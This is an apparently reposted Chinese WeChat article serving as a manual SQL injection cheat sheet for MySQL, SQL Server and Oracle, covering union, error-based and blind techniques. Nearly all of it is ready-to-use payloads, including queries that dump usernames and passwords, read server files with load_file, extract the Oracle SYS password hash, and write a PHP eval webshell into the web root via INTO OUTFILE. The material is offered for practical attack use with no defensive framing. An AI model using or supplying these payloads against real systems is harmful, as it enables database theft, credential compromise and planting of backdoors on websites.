> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TKLAy5V7sssiFwlmcivghA)

> **来自公众号：Bypass**

SQL 注入分类方式：  

```
提交方式：GET  POST COOKIE
参数注入：数字型/字符型/搜索型
数据库类型：ACCESS/Mysql/MSSQL/Oracle
手工注入方法：联合查询、报错注入、盲注（基于布尔型、基于时间延迟）

```

### **0x01 Mysql**

### Mysql 划分：权限  root        普通用户 版本  mysql>5.0   mysql<5.0  

**1.1 root 权限**

load_file 和 into outfile 用户必须有 FILE 权限，并且还需要知道网站的绝对路径

判断是否具有读写权限

```
and (select count(*) from mysql.user)>0#
and (select count(file_priv) from mysql.user)>#

```

A、Load_file() 该函数用来读取源文件的函数，只能读取绝对路径的网页文件

注意：路径符号”\” 错误  “\” 正确  “/” 正确，转换成十六进制，不用 “”

```
id=1 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,load_file（’/var/www/index.php’）(物理路径转16进制)

```

可以用来读取数据库连接文件获取数据连接账号、密码等

```
?id=1'and 1=2 union select 1,load_file('D:\\wamp\\www\\111.php')%23
id=1'and 1=2 union select 1,load_file(0x443A2F77616D702F7777772F312E706870)%23

```

B、into outfile 函数

条件：1. 绝对路径    2. 可以使用单引号

```
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/s
tudy/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --

```

**1.2 MySQL 联合查询**

1.2.1 适用于 mysql 低于 5.0 版本

```
1.判断是否可以注入
    ?id=1 and 1=1，页面正常
    ?id=1 and 1=2，页面空白
2.获得字段数
order by的方法来判断，比如：
    ?id=1 order by 4   页面显示正常
    ?id=1 order by 5   页面出错，说明字段数等于4
3.获得显示位
    ?id=1 and 1=2 union select 1,2,3,4 
    //比如，页面上出现了几个数字，分别是2，3，4，那么，这几个数字就被我们称作显示位。
4.猜表名
    猜表名的方法是，在第三步的完整的地址后加上：Form 表名，比如：
        ?id=1 and 1=2 union select 1,2,3,4 from users
    这样，当users表存在的话，页面就会显示正常，如果我们提交一个不存在的表名，页面就会出错。

5.猜字段
    使用：Concat(字段名)替换显示位的位置。
        ?id=1 and 1=2 union select 1,2,3,concat(username,password) from users

```

1.2.2 适用于 Mysql 5.0 以上版本支持查表查列

```
1.先判断是否可以注入
    and+1=1，页面正常
    and+1=2，页面空白
2.获得字段数：使用order by
提交：
    ?id=1 order by 4 正确。
    ?id=1 order by 5 错误。
    那么，判断出字段数为4。
3.获得显示位

提交：?id=1 +and+1=2+union+select+1,2,3,4
显示位为：2，3，4
4.获取信息
    ?id=1 +and+1=2+union+select+1,2,3,version()

    database() 
    user()  
    version() 
    database()  
    @@basedir  数据库安装路径
    @@datadir  数据库路径
5.查表
?id=1 and 1=2 union select 1,2,3,table_name from information_schema.tables where table_schema=0x74657374(数据库名test的Hex) limit 0,1--
得到表：test

6.查字段
    ?id=1 and 1=2 union select 1,2,3,column_name from 
information_schema.columns where table_name=0x74657374 limit 0,1--
    得到字段：id，username，password
7.爆字段内容
    ?id=1+and+1=2+union+select+1,2,3,concat(username,password) from+test

```

### **1.3 MySQL 报错注入**

mysql 暴错注入方法整理，通过 floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection 等方法。

多种报错注入方式：

```
and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a);
and (select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2)));
and extractvalue(1, concat(0x5c, (select VERSION() from information_schema.tables limit 1)))
and 1=(updatexml(1,concat(0x3a,(select user())),1))
and GeometryCollection((select*from(select*from(select @@version)f)x))
and polygon((select*from(select name_const(version(),1))x))
and linestring((select * from(select * from(select user())a)b))
and multilinestring((select * from(select * from(select version())a)b));
and multipoint((select * from(select * from(select user())a)b));
and multipolygon((select * from(select * from(select user())a)b));
and exp(~(select * from(select version())a));

```

### **1.4 MySQL 盲注**

基于布尔型注入

```
id=1 and (select length(user()))=20 # 返回正常页面  长度20位
id=1 and ascii(substring((SELECT username FROM users limit 0,1),1,1))=97
//截取username第一个数据的ascii值

```

基于时间型注入

```
1 xor (if(ascii(mid(user()from(1)for(1)))='r',sleep(5),0))
1 xor if(ascii(substr(user(),1,1)) like 1124,benchmark(1000000, md5('1')),'2')

```

### **0x02 SQLServer**

SA 权限：数据库操作，文件管理，命令执行，注册表读取等  

Db 权限：文件管理，数据库操作等

Public 权限：数据库操作

**2.1 SQLServer 联合查询**

```
1.判断是否存在注入
    ?id=1 and 1=1--  返回正确
    ?id=1 and 1=2--  返回错误

2.获取字段数
    ?id=1 order by 2-- 返回正确页面  
    ?id=1 order by 3-- 返回错误页面    字段长度为2

3.查看数据库版本
    ?id=1 and 1=2 union select  db_name(),null   //获得当前数据库

4.查看表名
    ?id=1 and 1=2 union select  top 1  TABLE_NAME ,2 from INFORMATION_SCHEMA.TABLES where table_name not in ('users') 

5.查看列名
    ?id=1 and 1=2 union select  top 1 column_name ,2  from  information_schema.columns where table_name ='users'  and column_name not in ('uname')

6.获取数据
    ?id=1 and 1=2 union select top 1 uname,null from users

```

**2.2 SQLServer 报错注入**

```
1.获取表名
?id=4' and 1>(select top 1  TABLE_NAME from INFORMATION_SCHEMA.TABLES  where TABLE_NAME not in ('admin') )--
2.获取列名
?id=4' and 1>(select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin' and column_name not in ('id')) --

3.获取数据
?id=4' and 1=(select top 1 pwd from admin) --

4.获取数据库信息
?id=1' and 1=(select @@version)--   //SQL Server 2000
?id=1' and 1=(select db_name())  //当前使用的数据库

```

**2.3 SQLServer 盲注**

```
1、猜表名

?id=1 and  (select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u') and len(name)=7)=1 --  //获取第一个表的长度7

?id=1 and (select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u') and ascii(substring(name,1,1))=116)=1 --    //截取第一个表第一位的ascii码

?id=1 and (select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u' and name not in ('users')) and ascii(substring(name,1,1))>115)=1 --//猜第二个表的第一位ASCII值
得到表名，进一步猜解字段

2、猜字段
id=1 and 
(select count(*) from syscolumns where name in (select top 1 name from syscolumns where id=(select id from sysobjects where name='users')) and ascii(substring(name,1,1))=117)=1 
//获取users表第一个字段的ASCII值

id=1 and 
(select count(*) from syscolumns where name in (select top 1 name from syscolumns where id=(select id from sysobjects where name='users') ) and name not in ('upass')  and ascii(substring(name,1,1))>90)=1  --
//获取user表第二个字段的第一位ASCII值

3、猜数据
id=1 and (ascii(substring((select top 1 uname from users),1,1)))=33 --  
//获取users表中uname字段的第一位ASCII值

```

**3.1 联合查询**

```
Union select null,null,null   从第一个null开始加’null’,得到显示位
Union select null,null,null from dual  返回正确，存在dual表
Union Select tablespace_name from user_tablespaces    //查库
Union Select table_name from user_tables where rownum = 1 and table_name<>’news’  //查表
Union Select column_name from user_tab_columns where table_name=’users’  //查列
?id=1 order by 1-- //获取字段数
and+1=1+union+all+select+(SELECT banner FROM v$version where rownum=1)+from+dual--//获取数据库版本
and+1=1+union+all+select+(select user from dual where rownum=1)+from+dual-- //获取当前连接数据库的用户名
union+all+select+(select password from sys.user$ where rownum=1 and name='SYS')+from+dual-- -- //获取用户SYS密文密码
union+all+select+(SELECT name FROM v$database)+from+dual-- //获取库名
and+1=1+union+all+select+(select table_name from user_tables where rownum=1)+from+dual--//获取第一个表名

```

**3.2 手工显错注入**

```
最大的区别就是utl_inaddr.get_host_address这个函数，10g可以调用，11g需要dba高权限

//判断是否是oracle
?id=1 and exists(select * from dual)--
 //获取库名
?id=1 and 1=utl_inaddr.get_host_address((SELECT name FROM v$database))—-
//获取数据库服务器所在ip
?id=1 and 1=ctxsys.drithsx.sn(1,(select UTL_INADDR.get_host_address from dual where rownum=1))-- 
?id=1 and 1= CTXSYS.CTX_QUERY.CHK_XPATH((select banner from v$version where rownum=1),'a','b')--
?id=1 or 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((select banner from v$version where rownum=1),'a','b')--
?id=1 and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --
?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual))--

```

**3.3 盲注**

基于布尔类型的盲注：

```
?id=7782' and length((SELECT name FROM v$database))=4--  获取数据库名长度
?id=7782'  and ascii(substr((SELECT name FROM v$database),1,1))=79-- 
获取数据库名第一位为O

```

基于时间延迟的盲注：

```
?id=7782' and 1=(CASE WHEN (ascii(substr((SELECT name FROM v$database),1,1))=79) THEN 1 ELSE 2 END)--
?id=7782'  AND 1=(CASE WHEN (ascii(substr((SELECT name FROM v$database),1,1))=79) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(103)||CHR(102)||CHR(102),5) ELSE 1 END)--

```

**推荐↓↓↓**

![](https://mmbiz.qpic.cn/mmbiz_jpg/NVvB3l3e9aG5kWic5P8XOwFOhXKjibAt6Yfb1QuqSRZaV5QGHtqqXZFWkia50TDjpWTBqG8Huj3aMlA6cOE9cBVkQ/640?wx_fmt=jpeg)

**Linux 学习**